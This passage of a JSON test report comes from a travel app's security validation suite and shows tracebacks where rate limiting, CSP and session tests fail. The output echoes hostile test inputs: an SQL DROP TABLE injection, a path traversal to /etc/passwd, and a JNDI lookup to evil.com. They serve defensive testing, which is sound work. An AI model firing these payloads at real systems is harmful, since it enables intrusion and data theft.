        "Traceback (most recent call last):\n  File \"/opt/rehber/seyahat_onerisi/test_security_validation.py\", line 553, in test_successful_login_clears_attempts\n    self.assertEqual(response.status_code, 200)\nAssertionError: 429 != 200\n\nStdout:\nSECURITY: Failed login attempt #1 from IP 127.0.0.1\nSECURITY: Failed login attempt #2 from IP 127.0.0.1\n",
        "Traceback (most recent call last):\n  File \"/opt/rehber/seyahat_onerisi/test_security_validation.py\", line 867, in test_json_injection_prevention\n    self.assertIn(response.status_code, [400, 500])\nAssertionError: 401 not found in [400, 500]\n\nStdout:\nLogin error: 400 Bad Request: The browser (or proxy) sent a request that this server could not understand.\nLogin error: 400 Bad Request: The browser (or proxy) sent a request that this server could not understand.\nSECURITY: Failed login attempt #1 from IP 127.0.0.1\n",
        "Traceback (most recent call last):\n  File \"/opt/rehber/seyahat_onerisi/test_security_validation.py\", line 845, in test_malicious_input_handling\n    self.assertIn(response.status_code, [400, 401, 500])\nAssertionError: 429 not found in [400, 401, 500]\n\nStdout:\nSECURITY: Failed login attempt #2 from IP 127.0.0.1\n",
        "Traceback (most recent call last):\n  File \"/opt/rehber/seyahat_onerisi/test_security_validation.py\", line 845, in test_malicious_input_handling\n    self.assertIn(response.status_code, [400, 401, 500])\nAssertionError: 429 not found in [400, 401, 500]\n\nStdout:\nSECURITY: Failed login attempt #2 from IP 127.0.0.1\n",
        "Traceback (most recent call last):\n  File \"/opt/rehber/seyahat_onerisi/test_security_validation.py\", line 845, in test_malicious_input_handling\n    self.assertIn(response.status_code, [400, 401, 500])\nAssertionError: 429 not found in [400, 401, 500]\n\nStdout:\nSECURITY: Failed login attempt #2 from IP 127.0.0.1\n",
        "Traceback (most recent call last):\n  File \"/opt/rehber/seyahat_onerisi/test_security_validation.py\", line 845, in test_malicious_input_handling\n    self.assertIn(response.status_code, [400, 401, 500])\nAssertionError: 429 not found in [400, 401, 500]\n\nStdout:\nSECURITY: Failed login attempt #2 from IP 127.0.0.1\n",
        "Traceback (most recent call last):\n  File \"/opt/rehber/seyahat_onerisi/test_security_validation.py\", line 845, in test_malicious_input_handling\n    self.assertIn(response.status_code, [400, 401, 500])\nAssertionError: 429 not found in [400, 401, 500]\n\nStdout:\nSECURITY: Failed login attempt #2 from IP 127.0.0.1\n",
        "Traceback (most recent call last):\n  File \"/opt/rehber/seyahat_onerisi/test_security_validation.py\", line 879, in test_parameter_pollution\n    self.assertIn(response.status_code, [400, 401])\nAssertionError: 429 not found in [400, 401]\n",
        "Traceback (most recent call last):\n  File \"/opt/rehber/seyahat_onerisi/test_security_validation.py\", line 645, in test_password_change_security\n    self.assertEqual(response.status_code, 200)\nAssertionError: 429 != 200\n",
        "Traceback (most recent call last):\n  File \"/opt/rehber/seyahat_onerisi/test_security_validation.py\", line 701, in test_session_termination_after_password_change\n    self.assertEqual(response1.status_code, 200)\nAssertionError: 429 != 200\n",
        "Traceback (most recent call last):\n  File \"/opt/rehber/seyahat_onerisi/test_security_validation.py\", line 776, in test_content_security_policy\n    self.assertNotIn(\"'unsafe-inline'\", csp)\nAssertionError: \"'unsafe-inline'\" unexpectedly found in \"default-src 'self'; script-src 'self' 'unsafe-inline' https://cdnjs.cloudflare.com https://cdn.jsdelivr.net; style-src 'self' 'unsafe-inline' https://cdnjs.cloudflare.com https://cdn.jsdelivr.net; img-src 'self' data: blob:; font-src 'self' https://cdnjs.cloudflare.com; connect-src 'self'; media-src 'self'; object-src 'none'; base-uri 'self'; form-action 'self';\"\n",
        "Traceback (most recent call last):\n  File \"/opt/rehber/seyahat_onerisi/test_security_validation.py\", line 761, in test_security_headers_presence\n    self.assertEqual(response.headers[header], expected_value,\nAssertionError: 'max-age=31536000; includeSubDomains; preload' != 'max-age=31536000; includeSubDomains'\n- max-age=31536000; includeSubDomains; preload\n?                                    ---------\n+ max-age=31536000; includeSubDomains\n : Security header 'Strict-Transport-Security' has incorrect value\n",
        "Traceback (most recent call last):\n  File \"/opt/rehber/seyahat_onerisi/test_security_validation.py\", line 363, in test_session_fixation_prevention\n    self.assertEqual(response.status_code, 200)\nAssertionError: 403 != 200\n",
        "Traceback (most recent call last):\n  File \"/opt/rehber/seyahat_onerisi/test_security_validation.py\", line 301, in test_session_timeout_enforcement\n    self.assertFalse(data['authenticated'])\nAssertionError: True is not false\n"
      ],
      "error_details": [],
      "output": "test_ip_based_rate_limiting (test_security_validation.TestBruteForceProtection.test_ip_based_rate_limiting)\nTest IP-based rate limiting. ... ok\ntest_lockout_duration_enforcement (test_security_validation.TestBruteForceProtection.test_lockout_duration_enforcement)\nTest that lockout duration is properly enforced. ... FAIL\ntest_progressive_delay_implementation (test_security_validation.TestBruteForceProtection.test_progressive_delay_implementation)\nTest progressive delay after failed attempts. ... ok\ntest_successful_login_clears_attempts (test_security_validation.TestBruteForceProtection.test_successful_login_clears_attempts)\nTest that successful login clears failed attempts. ... FAIL\ntest_csrf_protection_on_logout (test_security_validation.TestCSRFProtection.test_csrf_protection_on_logout)\nTest CSRF protection on logout endpoint. ... ok\ntest_csrf_protection_on_password_change (test_security_validation.TestCSRFProtection.test_csrf_protection_on_password_change)\nTest CSRF protection on password change endpoint. ... ok\ntest_csrf_token_generation (test_security_validation.TestCSRFProtection.test_csrf_token_generation)\nTest CSRF token generation and uniqueness. ... ok\ntest_csrf_token_invalidation_after_logout (test_security_validation.TestCSRFProtection.test_csrf_token_invalidation_after_logout)\nTest that CSRF tokens are invalidated after logout. ... ok\ntest_json_injection_prevention (test_security_validation.TestInputValidation.test_json_injection_prevention)\nTest prevention of JSON injection attacks. ... \n  test_json_injection_prevention (test_security_validation.TestInputValidation.test_json_injection_prevention) (json_input='{\"password\": \"test\", \"password\": \"test2\"}')\nTest prevention of JSON injection attacks. ... FAIL\ntest_malicious_input_handling (test_security_validation.TestInputValidation.test_malicious_input_handling)\nTest handling of malicious input attempts. ... \n  test_malicious_input_handling (test_security_validation.TestInputValidation.test_malicious_input_handling) (input='\"; DROP TABLE users; --')\nTest handling of malicious input attempts. ... FAIL\n  test_malicious_input_handling (test_security_validation.TestInputValidation.test_malicious_input_handling) (input='../../../etc/passwd')\nTest handling of malicious input attempts. ... FAIL\n  test_malicious_input_handling (test_security_validation.TestInputValidation.test_malicious_input_handling) (input='${jndi:ldap://evil.com/a}')\nTest handling of malicious input attempts. ... FAIL\n  test_malicious_input_handling (test_security_validation.TestInputValidation.test_malicious_input_handling) (input='\\x00\\x01\\x02')\nTest handling of malicious input attempts. ... FAIL\n  test_malicious_input_handling (test_security_validation.TestInputValidation.test_malicious_input_handling) (input='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA')\nTest handling of malicious input attempts. ... FAIL\ntest_parameter_pollution (test_security_validation.TestInputValidation.test_parameter_pollution)\nTest handling of parameter pollution attacks. ... FAIL\ntest_password_change_security (test_security_validation.TestPasswordSecurity.test_password_change_security)\nTest security measures in password change process. ... FAIL\ntest_password_hash_strength (test_security_validation.TestPasswordSecurity.test_password_hash_strength)\nTest that password hashes are properly generated. ... ok\ntest_password_strength_validation (test_security_validation.TestPasswordSecurity.test_password_strength_validation)\nTest password strength validation rules. ... ok\ntest_session_termination_after_password_change (test_security_validation.TestPasswordSecurity.test_session_termination_after_password_change)\nTest that all sessions are terminated after password change. ... FAIL\ntest_cache_control_headers (test_security_validation.TestSecurityHeaders.test_cache_control_headers)\nTest cache control headers for sensitive endpoints. ... ok\ntest_content_security_policy (test_security_validation.TestSecurityHeaders.test_content_security_policy)\nTest Content Security Policy header. ... FAIL\ntest_security_headers_presence (test_security_validation.TestSecurityHeaders.test_security_headers_presence)\nTest that all required security headers are present. ... FAIL\ntest_concurrent_session_handling (test_security_validation.TestSessionHijackingPrevention.test_concurrent_session_handling)\nTest handling of concurrent sessions from same user. ... ok\ntest_session_fixation_prevention (test_security_validation.TestSessionHijackingPrevention.test_session_fixation_prevention)\nTest prevention of session fixation attacks. ... FAIL\ntest_session_regeneration_after_login (test_security_validation.TestSessionHijackingPrevention.test_session_regeneration_after_login)\nTest that session ID is regenerated after successful login. ... ok\ntest_session_timeout_enforcement (test_security_validation.TestSessionHijackingPrevention.test_session_timeout_enforcement)\nTest that session timeout is properly enforced. ... FAIL\ntest_user_agent_consistency_check (test_security_validation.TestSessionHijackingPrevention.test_user_agent_consistency_check)\nTest user agent consistency checking for session security. ... ok\n\n======================================================================\nFAIL: test_lockout_duration_enforcement (test_security_validation.TestBruteForceProtection.test_lockout_duration_enforcement)\nTest that lockout duration is properly enforced.\n----------------------------------------------------------------------\nTraceback (most recent call last):\n  File \"/opt/rehber/seyahat_onerisi/test_security_validation.py\", line 516, in test_lockout_duration_enforcement\n    self.assertIn('locked', data['error'].lower())\nAssertionError: 'locked' not found in 'please wait 1 seconds before trying again.'\n\nStdout:\nSECURITY: Failed login attempt #1 from IP 127.0.0.1\nSECURITY: Failed login attempt #2 from IP 127.0.0.1\n\n======================================================================\nFAIL: test_successful_login_clears_attempts (test_security_validation.TestBruteForceProtection.test_successful_login_clears_attempts)\nTest that successful login clears failed attempts.\n----------------------------------------------------------------------\nTraceback (most recent call last):\n  File \"/opt/rehber/seyahat_onerisi/test_security_validation.py\", line 553, in test_successful_login_clears_attempts\n    self.assertEqual(response.status_code, 200)\nAssertionError: 429 != 200\n\nStdout:\nSECURITY: Failed login attempt #1 from IP 127.0.0.1\nSECURITY: Failed login attempt #2 from IP 127.0.0.1\n\n======================================================================\nFAIL: test_json_injection_prevention (test_security_validation.TestInputValidation.test_json_injection_prevention) (json_input='{\"password\": \"test\", \"password\": \"test2\"}')\nTest prevention of JSON injection attacks.\n----------------------------------------------------------------------\nTraceback (most recent call last):\n  File \"/opt/rehber/seyahat_onerisi/test_security_validation.py\", line 867, in test_json_injection_prevention\n    self.assertIn(response.status_code, [400, 500])\nAssertionError: 401 not found in [400, 500]\n\nStdout:\nLogin error: 400 Bad Request: The browser (or proxy) sent a request that this server could not understand.\nLogin error: 400 Bad Request: The browser (or proxy) sent a request that this server could not understand.\nSECURITY: Failed login attempt #1 from IP 127.0.0.1\n\n======================================================================\nFAIL: test_malicious_input_handling (test_security_validation.TestInputValidation.test_malicious_input_handling) (input='\"; DROP TABLE users; --')\nTest handling of malicious input attempts.\n----------------------------------------------------------------------\nTraceback (most recent call last):\n  File \"/opt/rehber/seyahat_onerisi/test_security_validation.py\", line 845, in test_malicious_input_handling\n    self.assertIn(response.status_code, [400, 401, 500])\nAssertionError: 429 not found in [400, 401, 500]\n\nStdout:\nSECURITY: Failed login attempt #2 from IP 127.0.0.1\n\n======================================================================\nFAIL: test_malicious_input_handling (test_security_validation.TestInputValidation.test_malicious_input_handling) (input='../../../etc/passwd')\nTest handling of malicious input attempts.\n----------------------------------------------------------------------\nTraceback (most recent call last):\n  File \"/opt/rehber/seyahat_onerisi/test_security_validation.py\", line 845, in test_malicious_input_handling\n    self.assertIn(response.status_code, [400, 401, 500])\nAssertionError: 429 not found in [400, 401, 500]\n\nStdout:\nSECURITY: Failed login attempt #2 from IP 127.0.0.1\n\n======================================================================\nFAIL: test_malicious_input_handling (test_security_validation.TestInputValidation.test_malicious_input_handling) (input='${jndi:ldap://evil.com/a}')\nTest handling of malicious input attempts.\n----------------------------------------------------------------------\nTraceback (most recent call last):\n  File \"/opt/rehber/seyahat_onerisi/test_security_validation.py\", line 845, in test_malicious_input_handling\n    self.assertIn(response.status_code, [400, 401, 500])\nAssertionError: 429 not found in [400, 401, 500]\n\nStdout:\nSECURITY: Failed login attempt #2 from IP 127.0.0.1\n\n======================================================================\nFAIL: test_malicious_input_handling (test_security_validation.TestInputValidation.test_malicious_input_handling) (input='\\x00\\x01\\x02')\nTest handling of malicious input attempts.\n----------------------------------------------------------------------\nTraceback (most recent call last):\n  File \"/opt/rehber/seyahat_onerisi/test_security_validation.py\", line 845, in test_malicious_input_handling\n    self.assertIn(response.status_code, [400, 401, 500])\nAssertionError: 429 not found in [400, 401, 500]\n\nStdout:\nSECURITY: Failed login attempt #2 from IP 127.0.0.1\n\n======================================================================\nFAIL: test_malicious_input_handling (test_security_validation.TestInputValidation.test_malicious_input_handling) (input='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA')\nTest handling of malicious input attempts.\n----------------------------------------------------------------------\nTraceback (most recent call last):\n  File \"/opt/rehber/seyahat_onerisi/test_security_validation.py\", line 845, in test_malicious_input_handling\n    self.assertIn(response.status_code, [400, 401, 500])\nAssertionError: 429 not found in [400, 401, 500]\n\nStdout:\nSECURITY: Failed login attempt #2 from IP 127.0.0.1\n\n======================================================================\nFAIL: test_parameter_pollution (test_security_validation.TestInputValidation.test_parameter_pollution)\nTest handling of parameter pollution attacks.\n----------------------------------------------------------------------\nTraceback (most recent call last):\n  File \"/opt/rehber/seyahat_onerisi/test_security_validation.py\", line 879, in test_parameter_pollution\n    self.assertIn(response.status_code, [400, 401])\nAssertionError: 429 not found in [400, 401]\n\n======================================================================\nFAIL: test_password_change_security (test_security_validation.TestPasswordSecurity.test_password_change_security)\nTest security measures in password change process.\n----------------------------------------------------------------------\nTraceback (most recent call last):\n  File \"/opt/rehber/seyahat_onerisi/test_security_validation.py\", line 645, in test_password_change_security\n    self.assertEqual(response.status_code, 200)\nAssertionError: 429 != 200\n\n======================================================================\nFAIL: test_session_termination_after_password_change (test_security_validation.TestPasswordSecurity.test_session_termination_after_password_change)\nTest that all sessions are terminated after password change.\n----------------------------------------------------------------------\nTraceback (most recent call last):\n  File \"/opt/rehber/seyahat_onerisi/test_security_validation.py\", line 701, in test_session_termination_after_password_change\n    self.assertEqual(response1.status_code, 200)\nAssertionError: 429 != 200\n\n======================================================================\nFAIL: test_content_security_policy (test_security_validation.TestSecurityHeaders.test_content_security_policy)\nTest Content Security Policy header.\n----------------------------------------------------------------------\nTraceback (most recent call last):\n  File \"/opt/rehber/seyahat_onerisi/test_security_validation.py\", line 776, in test_content_security_policy\n    self.assertNotIn(\"'unsafe-inline'\", csp)\nAssertionError: \"'unsafe-inline'\" unexpectedly found in \"default-src 'self'; script-src 'self' 'unsafe-inline' https://cdnjs.cloudflare.com https://cdn.jsdelivr.net; style-src 'self' 'unsafe-inline' https://cdnjs.cloudflare.com https://cdn.jsdelivr.net; img-src 'self' data: blob:; font-src 'self' https://cdnjs.cloudflare.com; connect-src 'self'; media-src 'self'; object-src 'none'; base-uri 'self'; form-action 'self';\"\n\n======================================================================\nFAIL: test_security_headers_presence (test_security_validation.TestSecurityHeaders.test_security_headers_presence)\nTest that all required security headers are present.\n----------------------------------------------------------------------\nTraceback (most recent call last):\n  File \"/opt/rehber/seyahat_onerisi/test_security_validation.py\", line 761, in test_security_headers_presence\n    self.assertEqual(response.headers[header], expected_value,\nAssertionError: 'max-age=31536000; includeSubDomains; preload' != 'max-age=31536000; includeSubDomains'\n- max-age=31536000; includeSubDomains; preload\n?                                    ---------\n+ max-age=31536000; includeSubDomains\n : Security header 'Strict-Transport-Security' has incorrect value\n\n======================================================================\nFAIL: test_session_fixation_prevention (test_security_validation.TestSessionHijackingPrevention.test_session_fixation_prevention)\nTest prevention of session fixation attacks.\n----------------------------------------------------------------------\nTraceback (most recent call last):\n  File \"/opt/rehber/seyahat_onerisi/test_security_validation.py\", line 363, in test_session_fixation_prevention\n    self.assertEqual(response.status_code, 200)\nAssertionError: 403 != 200\n\n======================================================================\nFAIL: test_session_timeout_enforcement (test_security_validation.TestSessionHijackingPrevention.test_session_timeout_enforcement)\nTest that session timeout is properly enforced.\n----------------------------------------------------------------------\nTraceback (most recent call last):\n  File \"/opt/rehber/seyahat_onerisi/test_security_validation.py\", line 301, in test_session_timeout_enforcement\n    self.assertFalse(data['authenticated'])\nAssertionError: True is not false\n\n----------------------------------------------------------------------\nRan 23 tests in 4.151s\n\nFAILED (failures=15)\n",
      "status": "critical"
    },
    {
      "module": "test_end_to_end_authentication",
      "description": "End-to-End Authentication",
      "error": "Module not available: No module named 'selenium'",
      "tests_run": 0,
      "failures": 0,
      "errors": 1,
      "skipped": 0,
      "success_rate": 0,
      "duration": 0,
      "status": "unavailable"
    },
    {
      "module": "test_browser_compatibility",
      "description": "Browser Compatibility",
      "error": "Module not available: No module named 'selenium'",
      "tests_run": 0,
      "failures": 0,
      "errors": 1,
      "skipped": 0,
      "success_rate": 0,
      "duration": 0,
      "status": "unavailable"
    }
  ]
}